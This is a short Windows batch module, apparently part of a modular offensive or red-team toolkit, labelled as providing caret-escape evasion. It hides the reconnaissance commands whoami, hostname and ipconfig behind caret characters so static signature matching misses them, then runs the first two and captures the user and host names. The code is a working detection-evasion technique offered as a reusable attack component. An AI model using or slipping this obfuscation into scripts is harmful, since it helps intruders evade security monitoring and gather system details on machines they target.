REM provides: evasion_caret_escape
REM depends: (none)
REM description: Caret-escape obfuscation to break static string matching

REM Caret insertion breaks string signatures but cmd.exe strips them at parse time
set "C1=w^h^o^a^m^i"
set "C2=h^o^s^t^n^a^m^e"
set "C3=i^p^c^o^n^f^i^g"

REM Execute obfuscated commands
for /f "tokens=*" %%a in ('%C1%') do set "UNAME=%%a"
for /f "tokens=*" %%b in ('%C2%') do set "HNAME=%%b"
